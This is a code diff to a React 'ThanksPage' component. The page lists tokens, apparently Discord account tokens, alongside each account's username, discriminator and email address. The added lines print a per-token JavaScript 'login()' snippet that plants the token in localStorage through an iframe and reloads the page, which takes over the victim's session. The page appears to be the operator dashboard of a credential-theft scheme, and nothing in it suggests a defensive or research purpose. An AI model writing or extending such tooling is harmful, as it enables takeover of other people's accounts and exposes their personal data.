@@ -10,12 +10,28 @@ const ThanksPage = async () => {
       <ul>
         {tokens.length > 0 ? (
           tokens.map((tokenData, index) => (
-            <li key={index} className=''>  
-              <strong className='w-full'>Token: {tokenData.token} </strong><br />
+            <li key={index}>
+              <strong className='w-full'>Token: {tokenData.token}</strong><br />
               {tokenData.userData ? (
                 <>
-                  <strong>User:</strong> {tokenData.userData.username}#{tokenData.userData.discriminator} <br />
+                  <strong>User:</strong> {tokenData.userData.username}#{tokenData.userData.discriminator}<br />
                   <strong>Email:</strong> {tokenData.userData.email}
+                  <pre>
+                    <code className='text-[10px]'>
+                      {`
+
+function login() {
+  setInterval(() => {
+    document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage.token = "${tokenData.token}"
+  }, 50);
+  setTimeout(() => {
+    location.reload();
+  }, 2500);
+}
+
+login();`}
+                    </code>
+                  </pre>
                 </>
               ) : (
                 <em>Token is invalid or expired</em>
@@ -26,6 +42,7 @@ const ThanksPage = async () => {
           <p>No tokens found.</p>
         )}
       </ul>
+
     </div>
   );
 };
